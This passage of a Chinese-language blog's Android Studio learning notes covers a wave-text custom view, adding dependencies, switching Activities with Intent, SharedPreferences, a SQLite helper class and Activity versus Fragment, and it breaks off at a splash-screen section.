<span class="type">float</span> <span class="title function_">getMaskX</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> maskX;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMaskX</span><span class="params">(<span class="type">float</span> maskX)</span> {</span><br><span class="line">        <span class="built_in">this</span>.maskX = maskX;</span><br><span class="line">        invalidate();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">float</span> <span class="title function_">getMaskY</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> maskY;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMaskY</span><span class="params">(<span class="type">float</span> maskY)</span> {</span><br><span class="line">        <span class="built_in">this</span>.maskY = maskY;</span><br><span class="line">        invalidate();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSinking</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> sinking;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSinking</span><span class="params">(<span class="type">boolean</span> sinking)</span> {</span><br><span class="line">        <span class="built_in">this</span>.sinking = sinking;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSetUp</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> setUp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTextColor</span><span class="params">(<span class="type">int</span> color)</span> {</span><br><span class="line">        <span class="built_in">super</span>.setTextColor(color);</span><br><span class="line">        createShader();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTextColor</span><span class="params">(ColorStateList colors)</span> {</span><br><span class="line">        <span class="built_in">super</span>.setTextColor(colors);</span><br><span class="line">        createShader();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onSizeChanged</span><span class="params">(<span class="type">int</span> w, <span class="type">int</span> h, <span class="type">int</span> oldw, <span class="type">int</span> oldh)</span> {</span><br><span class="line">        <span class="built_in">super</span>.onSizeChanged(w, h, oldw, oldh);</span><br><span class="line"></span><br><span class="line">        createShader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!setUp) {</span><br><span class="line">            setUp = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (animationSetupCallback != <span class="literal">null</span>) {</span><br><span class="line">                animationSetupCallback.onSetupAnimation(TitanicTextView.<span class="built_in">this</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create the shader</span></span><br><span class="line"><span class="comment">     * draw the wave with current color for a background</span></span><br><span class="line"><span class="comment">     * repeat the bitmap horizontally, and clamp colors vertically</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createShader</span><span class="params">()</span> {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (wave == <span class="literal">null</span>) {</span><br><span class="line">            wave = getResources().getDrawable(R.drawable.wave);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">waveW</span> <span class="operator">=</span> wave.getIntrinsicWidth();</span><br><span class="line">        <span class="type">int</span> <span class="variable">waveH</span> <span class="operator">=</span> wave.getIntrinsicHeight();</span><br><span class="line"></span><br><span class="line">        <span class="type">Bitmap</span> <span class="variable">b</span> <span class="operator">=</span> Bitmap.createBitmap(waveW, waveH, Bitmap.Config.ARGB_8888);</span><br><span class="line">        <span class="type">Canvas</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Canvas</span>(b);</span><br><span class="line"></span><br><span class="line">        c.drawColor(getCurrentTextColor());</span><br><span class="line"></span><br><span class="line">        wave.setBounds(<span class="number">0</span>, <span class="number">0</span>, waveW, waveH);</span><br><span class="line">        wave.draw(c);</span><br><span class="line"></span><br><span class="line">        shader = <span class="keyword">new</span> <span class="title class_">BitmapShader</span>(b, Shader.TileMode.REPEAT, Shader.TileMode.CLAMP);</span><br><span class="line">        getPaint().setShader(shader);</span><br><span class="line"></span><br><span class="line">        offsetY = (getHeight() - waveH) / <span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDraw</span><span class="params">(Canvas canvas)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// modify text paint shader according to sinking state</span></span><br><span class="line">        <span class="keyword">if</span> (sinking &amp;&amp; shader != <span class="literal">null</span>) {</span><br><span class="line"></span><br><span class="line">            <span class="comment">// first call after sinking, assign it to our paint</span></span><br><span class="line">            <span class="keyword">if</span> (getPaint().getShader() == <span class="literal">null</span>) {</span><br><span class="line">                getPaint().setShader(shader);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">// translate shader accordingly to maskX maskY positions</span></span><br><span class="line">            <span class="comment">// maskY is affected by the offset to vertically center the wave</span></span><br><span class="line">            shaderMatrix.setTranslate(maskX, maskY + offsetY);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// assign matrix to invalidate the shader</span></span><br><span class="line">            shader.setLocalMatrix(shaderMatrix);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            getPaint().setShader(<span class="literal">null</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.onDraw(canvas);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个类继承了TextView，这代表如果要使用这个文件，则是导入组件，README中也是这样告诉你的。</p><p>How to use</p><p>Add a <code>TitanicTextView</code> to your layout:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;com.romainpiel.titanic.TitanicTextView</span><br><span class="line">    android:id="@+id/titanic_tv"</span><br><span class="line">    android:text="@string/loading"</span><br><span class="line">    android:layout_width="wrap_content"</span><br><span class="line">    android:layout_height="wrap_content"</span><br><span class="line">    android:textColor="#212121"</span><br><span class="line">    android:textSize="70sp"/&gt;</span><br></pre></td></tr></tbody></table></figure><p>至此最关键的部分已经搞定，复制文件的时候需要注意层级关系，同时复制完成后可能会遇到报错的情况，这是因为自己的项目一些引入的路径可能不对，需要重新更改下路径，比如官方给出的com.romainpiel.titanic.TitanicTextView在自己的项目中并不对，因为我的层级不是这样的，对我而言，则是使用:com.romainpiel.titanic.library.TitanicTextView，举一反三，其他也是如此。</p><p>注意将所有用到的文件都复制进去，这里还有一张资源图片就不过多讲了。</p><p>至此，已经成功使用了他人的项目，一些细节的修改可以通过阅读代码来做到。</p><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><p>项目自带的功能已经无法满足当前的开发，这时候就需要导入依赖来获得更多的功能支持，这里我用我目前需要的依赖作为演示来告诉你如何导入依赖。</p><p>在我做的项目中，我需要一个可以将数据转换为excol表格的功能，在网上翻阅显示需要使用apache官方制作的依赖API，叫做org.apache.poi，确定好需要导入的版本，然后打开——项目结构——依赖——找到+号——点击第一个lib，可以看到点击+号后有两个选择，这方便代表在线寻找lib和通过jar包导入，我没有jar包，所以使用搜索。</p><p>搜索org.apache.poi后，找到具体的依赖和选好需要的版本后，点击应用和确定，开始自动导入依赖进行下载。</p><p>亦或者本地下载jar包后，可以在libs中炸包。</p><p>等待下载完成后即可。</p><h2 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h2><p>一个页面所能展示的组件总是有限的，虽然你可以通过隐藏组件的方式来做到伪跳转页面，但是这样显然会让代码变的臃肿，同时不方便维护。</p><p>IDEA有提供更加便捷的跳转页面的方式，只需要创建一个页面，然后几行代码，一切就会帮你搞定。</p><p>在您的项目中创建两个活动（Activity），即两个页面。您可以通过在项目资源管理器中右键单击“app”文件夹并选择“New -&gt; Activity -&gt; Empty Activity”来创建新的活动。</p><p>创建完成后，会发现多了两个文件，分别是代表Main的MainActivit2，和在layout里的activity_main2.xml，其中一个是到这个页面被创建的时候会执行的代码块和用来给页面布局的xml。</p><p>想要实现跳转，也只需要一个契机，比如创建一个按钮，点击后跳转，这需要使用提供好的方法。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//        获取jump按钮</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">btn_jump</span> <span class="operator">=</span> findViewById(R.id.btn_jump);</span><br><span class="line"></span><br><span class="line">        btn_jump.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> {</span><br><span class="line"><span class="comment">//                JUMP other Layout</span></span><br><span class="line">                Log.e(<span class="string">"TAG"</span>,<span class="string">"JUMP被点击了"</span>);</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, MainActivity2.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            }</span><br><span class="line">        });</span><br></pre></td></tr></tbody></table></figure><p>获取第一个页面的按钮，然后重写点击方法，通过new Intent来填写两个参数，来告诉代码从哪里跳转到哪里，比如我从第一个页面跳转到第二个页面就是，MainActivity.this，.this不就是当前吗，然后MainActivity2.class，则是第二个页面的类。</p><p>至此跳转完成。</p><p>这部分我参考了掘金的一篇文章：<a href="https://juejin.cn/s/android%20studio%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%B7%B3%E8%BD%AC">https://juejin.cn/s/android%20studio%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%B7%B3%E8%BD%AC</a></p><p>文章内容也贴在下方：</p><h2 id="android-studio实现两个页面的跳转"><a href="#android-studio实现两个页面的跳转" class="headerlink" title="android studio实现两个页面的跳转"></a>android studio实现两个页面的跳转</h2><p>要在 Android Studio 中实现两个页面的跳转，您可以按照以下步骤进行操作：</p><ol><li>创建一个新的 Android Studio 项目。</li><li>在您的项目中创建两个活动（Activity），即两个页面。您可以通过在项目资源管理器中右键单击“app”文件夹并选择“New -&gt; Activity -&gt; Empty Activity”来创建新的活动。</li><li>在第一个活动中，添加一个按钮或其他视图元素，以触发跳转到第二个活动。您可以在 XML 布局文件中添加该元素，如下所示：</li></ol><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">xml复制代码<span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/btn_go_to_second_activity"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Go to Second Activity"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></tbody></table></figure><ol><li>在第一个活动的 Java 代码中，获取对该按钮的引用，并为其设置一个点击监听器。在监听器中，创建一个 Intent 对象，并使用 startActivity() 方法将其传递给第二个活动。代码如下所示：</li></ol><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">java复制代码<span class="type">Button</span> <span class="variable">btnGoToSecondActivity</span> <span class="operator">=</span> findViewById(R.id.btn_go_to_second_activity);</span><br><span class="line">btnGoToSecondActivity.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> {</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(FirstActivity.<span class="built_in">this</span>, SecondActivity.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol><li>在第二个活动中，您可以添加返回第一个活动的按钮。同样，您可以在 XML 布局文件中添加该元素，如下所示：</li></ol><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">xml复制代码<span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/btn_go_back"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Go Back"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></tbody></table></figure><ol><li>在第二个活动的 Java 代码中，获取对该按钮的引用，并为其设置一个点击监听器。在监听器中，使用 finish() 方法关闭第二个活动，返回第一个活动。代码如下所示：</li></ol><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">java复制代码<span class="type">Button</span> <span class="variable">btnGoBack</span> <span class="operator">=</span> findViewById(R.id.btn_go_back);</span><br><span class="line">btnGoBack.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> {</span><br><span class="line">        finish();</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>通过以上步骤，您可以在 Android Studio 中实现两个页面之间的跳转。请注意，在创建 Intent 对象时，您需要指定要跳转到的活动类名。同时，在第二个活动中返回第一个活动时，您可以使用 finish() 方法关闭第二个活动。</p><h2 id="SharedPreferences"><a href="#SharedPreferences" class="headerlink" title="SharedPreferences"></a>SharedPreferences</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>通过创建xml,和使用它的编辑方法实现添加数据删除数据或者其他操作</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ShowContainer</span><span class="params">()</span>{</span><br><span class="line">        <span class="comment">//        读取数据添加到容器里</span></span><br><span class="line">        <span class="type">SharedPreferences</span> <span class="variable">sharedPreferences</span> <span class="operator">=</span> getSharedPreferences(<span class="string">"my_data"</span>, MODE_PRIVATE);</span><br><span class="line">        <span class="comment">//        获取SharedPreferences的编辑对象</span></span><br><span class="line">        Map&lt;String, String&gt; dataMap = parseStringToMap(sharedPreferences.getAll().toString());</span><br><span class="line"><span class="comment">//                        DataMap只输出了Values</span></span><br><span class="line">        System.out.println(dataMap.values() + <span class="string">"size:"</span> + dataMap.size());</span><br><span class="line">        <span class="comment">// 获取要添加的组件的容器</span></span><br><span class="line">        <span class="type">LinearLayout</span> <span class="variable">container</span> <span class="operator">=</span> findViewById(R.id.main_line);</span><br><span class="line">        container.removeAllViews();</span><br><span class="line">        <span class="comment">//        倒序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> dataMap.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) {</span><br><span class="line">            <span class="comment">//            创建TextView</span></span><br><span class="line">            <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextView</span>(AddActivity.<span class="built_in">this</span>);</span><br><span class="line">            textView.setText(dataMap.get(String.valueOf(i+<span class="number">1</span>)));</span><br><span class="line">            textView.setTextSize(<span class="number">30</span>);</span><br><span class="line">            container.addView(textView);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>这个方法新建对象创建了my_data.xml将文件存储在这里。</p><p>不管是在模拟器运行还是在真机运动，如果你需要找到文件的具体位置那么可以阅读下面文章:</p><p>通過使用SharedPreferences可以将数据保存在本地，在一篇博文中，提到:</p><p>SharedPreferences 会在应用包目录中生成一个xml文件，将数据保存在里面,可以实现数据持久性保存。</p><p>创建的数据，保存在 Data -&gt; Data -&gt; 包名 -&gt; shared_prefs 文件夹中</p><p>博文地址:<a href="https://www.cnblogs.com/gfwei/p/11781050.html">https://www.cnblogs.com/gfwei/p/11781050.html</a></p><p>但在我的实际寻找中，我没有在com.sharedPreferences里找到，可能是因为我是在模拟器运行中找的，我是在我的项目包名里面找到了这个文件，确实是my_data.xml。这个包名的意思就是项目的包名。</p><h2 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h2><p>创建帮助类</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.financing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.database.DatabaseErrorHandler;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.Nullable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DBOpenHelper</span> <span class="keyword">extends</span> <span class="title class_">android</span>.database.sqlite.SQLiteOpenHelper {</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DBOpenHelper</span><span class="params">(<span class="meta">@Nullable</span> Context context, <span class="meta">@Nullable</span> String name, <span class="meta">@Nullable</span> SQLiteDatabase.CursorFactory factory, <span class="type">int</span> version)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, name, factory, version);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DBOpenHelper</span><span class="params">(<span class="meta">@Nullable</span> Context context, <span class="meta">@Nullable</span> String name, <span class="meta">@Nullable</span> SQLiteDatabase.CursorFactory factory, <span class="type">int</span> version, <span class="meta">@Nullable</span> DatabaseErrorHandler errorHandler)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, name, factory, version, errorHandler);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="comment">//    使用onCreate可以在初次使用数据库时，自动创建表，第二次启动则不会创建，自带了判断</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> {</span><br><span class="line">        <span class="comment">//创建数据库sql语句并执行</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">"CREATE TABLE expenditure ("</span> +</span><br><span class="line">                <span class="string">"id INTEGER PRIMARY KEY AUTOINCREMENT,"</span> +</span><br><span class="line">                <span class="string">"amount REAL,"</span> +</span><br><span class="line">                <span class="string">"category TEXT,"</span> +</span><br><span class="line">                <span class="string">"date DATE,"</span> +</span><br><span class="line">                <span class="string">"transaction_method TEXT,"</span> +</span><br><span class="line">                <span class="string">"account TEXT,"</span> +</span><br><span class="line">                <span class="string">"payee TEXT,"</span> +</span><br><span class="line">                <span class="string">"location TEXT,"</span> +</span><br><span class="line">                <span class="string">"attachment TEXT,"</span> +</span><br><span class="line">                <span class="string">"notes TEXT)"</span>;</span><br><span class="line">        db.execSQL(sql);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>使用一个数据库</p><p>在上述代码中，<code>null</code>和<code>1</code>是用于创建数据库以及获取可写数据库的参数。</p><p>对于<code>null</code>参数，它表示数据库游标工厂（<code>CursorFactory</code>），用于控制查询结果集指针的行为。如果你不需要自定义行为，可以将其设置为<code>null</code>，系统将使用默认的游标工厂。</p><p>而对于<code>1</code>参数，它表示数据库版本号（database version），用于管理数据库的升级和降级。每当你对数据库进行结构上的改变时，你需要递增版本号。这样在下一次打开数据库时，系统会调用<code>onUpgrade()</code>方法，你可以在该方法中执行数据库的升级操作。对于刚开始创建的数据库，版本号通常设置为1。</p><p>这些参数可以根据你的实际需求进行自定义调整。</p><h2 id="保存变量"><a href="#保存变量" class="headerlink" title="保存变量"></a>保存变量</h2><p>有时候我们会想要保存一些变量到本地，来实现比如打开APP加载背景路径等，这样的好处是，当你想要换背景，只需要复制到内部存储里然后改变变量的值就可以在下次加载的时候启用成功了。</p><h3 id="什么是-SharedPreferences？"><a href="#什么是-SharedPreferences？" class="headerlink" title="什么是 SharedPreferences？"></a>什么是 SharedPreferences？</h3><p><code>SharedPreferences</code> 是 Android 提供的一种轻量级的数据存储机制，适合于保存小量的简单数据，如用户设置、应用状态等。它以键值对（key-value pairs）的形式存储数据，便于进行快速读取和写入。</p><h3 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h3><ul><li><strong>轻量级</strong>：适合存储少量数据。</li><li><strong>持久性</strong>：即使应用关闭或设备重启，数据仍会被保留。</li><li><strong>简单易用</strong>：API 简洁直观，方便开发者使用。</li></ul><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h3 id="1-获取-SharedPreferences-实例"><a href="#1-获取-SharedPreferences-实例" class="headerlink" title="1. 获取 SharedPreferences 实例"></a>1. 获取 SharedPreferences 实例</h3><p>使用 <code>getSharedPreferences()</code> 方法获取指定名称的 <code>SharedPreferences</code> 对象。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">SharedPreferences</span> <span class="variable">sharedPreferences</span> <span class="operator">=</span> getSharedPreferences(<span class="string">"MyAppPrefs"</span>, MODE_PRIVATE);</span><br></pre></td></tr></tbody></table></figure><ul><li><code>"MyAppPrefs"</code>：这是您自定义的文件名，用于存储键值对。</li><li><code>MODE_PRIVATE</code>：表示该文件只能被当前应用访问。</li></ul><h3 id="2-写入数据"><a href="#2-写入数据" class="headerlink" title="2. 写入数据"></a>2. 写入数据</h3><p>使用 <code>SharedPreferences.Editor</code> 对象来编辑 <code>SharedPreferences</code> 数据。可以使用 <code>putString()</code>, <code>putInt()</code>, <code>putBoolean()</code> 等方法来存储不同类型的数据。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">SharedPreferences.<span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sharedPreferences.edit();</span><br><span class="line">editor.putString(<span class="string">"username"</span>, <span class="string">"john_doe"</span>); <span class="comment">// 保存字符串</span></span><br><span class="line">editor.putInt(<span class="string">"age"</span>, <span class="number">30</span>); <span class="comment">// 保存整数</span></span><br><span class="line">editor.putBoolean(<span class="string">"isLoggedIn"</span>, <span class="literal">true</span>); <span class="comment">// 保存布尔值</span></span><br><span class="line">editor.apply(); <span class="comment">// 提交更改</span></span><br></pre></td></tr></tbody></table></figure><ul><li><code>apply()</code>：异步保存数据，不会阻塞主线程。如果需要立即写入，可以使用 <code>commit()</code>，但会同步写入，相对较慢。</li></ul><h3 id="3-读取数据"><a href="#3-读取数据" class="headerlink" title="3. 读取数据"></a>3. 读取数据</h3><p>通过 <code>getString()</code>, <code>getInt()</code>, <code>getBoolean()</code> 等方法读取之前保存的数据。可以提供一个默认值，以防在没有找到对应键时返回 null。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> sharedPreferences.getString(<span class="string">"username"</span>, <span class="string">"default_user"</span>); <span class="comment">// 读取字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> sharedPreferences.getInt(<span class="string">"age"</span>, <span class="number">0</span>); <span class="comment">// 读取整数</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isLoggedIn</span> <span class="operator">=</span> sharedPreferences.getBoolean(<span class="string">"isLoggedIn"</span>, <span class="literal">false</span>); <span class="comment">// 读取布尔值</span></span><br></pre></td></tr></tbody></table></figure><h3 id="4-移除数据"><a href="#4-移除数据" class="headerlink" title="4. 移除数据"></a>4. 移除数据</h3><p>如果您需要删除某个键对应的数据，可以使用 <code>remove()</code> 方法。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">editor.remove(<span class="string">"username"</span>); <span class="comment">// 删除键为 "username" 的数据</span></span><br><span class="line">editor.apply(); <span class="comment">// 提交更改</span></span><br></pre></td></tr></tbody></table></figure><h3 id="5-清空所有数据"><a href="#5-清空所有数据" class="headerlink" title="5. 清空所有数据"></a>5. 清空所有数据</h3><p>如果您想要清空 <code>SharedPreferences</code> 中的所有数据，可以使用 <code>clear()</code> 方法。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">editor.clear(); <span class="comment">// 清空所有数据</span></span><br><span class="line">editor.apply(); <span class="comment">// 提交更改</span></span><br></pre></td></tr></tbody></table></figure><h3 id="保存的文件类型"><a href="#保存的文件类型" class="headerlink" title="保存的文件类型"></a>保存的文件类型</h3><ul><li><p><strong>文件位置</strong>：<code>SharedPreferences</code> 文件通常保存在以下路径：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/data/data/&lt;your_package_name&gt;/shared_prefs/MyAppPrefs.xml</span><br></pre></td></tr></tbody></table></figure><p>其中 <code>&lt;your_package_name&gt;</code> 是您应用的包名，例如 <code>com.example.myapp</code>。</p></li><li><p><strong>文件类型</strong>：保存的数据以 XML 格式存储。例如，文件内容可能类似于：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"john_doe"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"30"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">boolean</span> <span class="attr">name</span>=<span class="string">"isLoggedIn"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p>在Android studio中清理虚拟机设备</p><p>当我们不断调试项目，反复运行设备，虚拟机里可能会多出很多文件，当我们需要清理的时候，通过打开虚拟机管理窗口，然后找到需要清理的设备，点击最右边的三个带你，找到 wipe Data 可以清理干净了</p><h1 id="重要组件"><a href="#重要组件" class="headerlink" title="重要组件"></a>重要组件</h1><p>Activity和Fragment是Android应用程序中的两个重要组件。</p><p><strong>Activity（活动）</strong>是用户与应用程序交互的主要界面单元。每个Activity都是一个单独的屏幕，它负责处理用户输入、加载布局、管理生命周期等。通常，一个应用程序由多个Activity组成，每个Activity代表一个屏幕，用户通过在不同的Activity之间进行转换来与应用程序进行交互。</p><p><strong>Fragment（片段）</strong>是Activity界面的一部分或一块可重用的UI组件。一个Activity可以包含多个Fragment，并且Fragment可以在运行时动态添加、移除或替换。Fragment具有自己的生命周期，并且可以嵌套在Activity的布局中。使用Fragment可以使界面更加模块化和灵活，有助于构建适应不同屏幕尺寸和方向的响应式界面。</p><p>它们之间的主要区别在于：</p><ol><li><strong>生命周期管理</strong>：Activity有自己的生命周期方法（如onCreate，onStart，onResume等），而Fragment也有类似的生命周期方法，但与Activity的生命周期方法不完全相同。Fragment的生命周期受到其宿主Activity的生命周期影响。</li><li><strong>布局管理</strong>：Activity有自己的布局文件（XML文件），定义整个屏幕的布局结构，而Fragment通常嵌套在Activity的布局中，可以与Activity共享同一个布局文件，也可以使用独立的布局文件。</li><li><strong>重用性和灵活性</strong>：Fragment的设计目的是提高UI组件的重用性和灵活性。通过在不同的Activity中重用Fragment，可以减少重复代码，简化开发流程，并且能够更灵活地构建多屏幕应用程序。</li></ol><p>总的来说，Activity是整个应用程序的主要组成部分，而Fragment是Activity的一部分，用于实现界面的模块化和重用。在学习Android开发时，通常建议先学习Activity，然后深入理解Fragment的使用。</p><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>学习Andriod Studio是为了开发一款理财软件，在学习的过程中我也会记录开发过程，只有实践和理论同时进行，才能让学习的效率更高。</p><h2 id="开屏展示"><a href="#开屏展示" class="headerlink" 